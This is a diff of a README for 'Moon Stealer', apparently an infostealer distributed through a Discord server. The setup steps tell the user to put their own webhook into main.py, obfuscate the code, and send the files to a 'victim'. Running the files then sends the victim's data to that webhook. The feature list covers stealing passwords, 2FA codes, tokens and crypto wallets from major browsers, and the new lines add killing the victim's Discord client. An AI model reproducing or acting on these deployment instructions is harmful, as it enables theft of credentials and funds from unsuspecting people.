@@ -14,7 +14,7 @@ Moon Stealer (ムーン)
   </kbd>
 </p>
 
-### Discord: Yuvi#0930
+### [MOON Official Discord Server](https://discord.gg/fnNd26Depz)
 
 ### Setup
 
@@ -22,17 +22,15 @@ Moon Stealer (ムーン)
 
 2. Extract zip
 
-3. Run `install_python.bat` if you don't have python installed
+3. Run `install_python.bat` if you don't have python installed.
 
 4. Open `main.py` with any text editor such as notepad.
 
-5. Replace X with your webhook `hook = "X"`
+5. Replace `X` with your webhook where it says `hook = "X"`
 
 6. Obfuscate your code: https://pyobfuscate.com/ (Recommended)
 
-5. Convert to .pyc file by typing `python -m py_compile {directory_of_PY_file}` this will create a .PYC file which is highly obfuscated. (Optional)
-
-7. Send to victim and when they run `main.py` you will have their info in the webhook you provided in step 5.
+7. Send `main.py` and `assets` (Required) to the victim and when they run `main.py` you will have their info in the webhook you provided in step 5.
 
 <a id="features"></a>
 
@@ -68,6 +66,10 @@ Moon Stealer (ムーン)
 - File Stealer
     - Search User PC for Passwords, 2fa codes, tokens, wallets...
     - Browsers: Opera, Chrome, Brave, Yandex, Edge
+
+- Extras
+    - Kill victim's discord client
+    - Get information for the user's PC
 
 ## Important
 
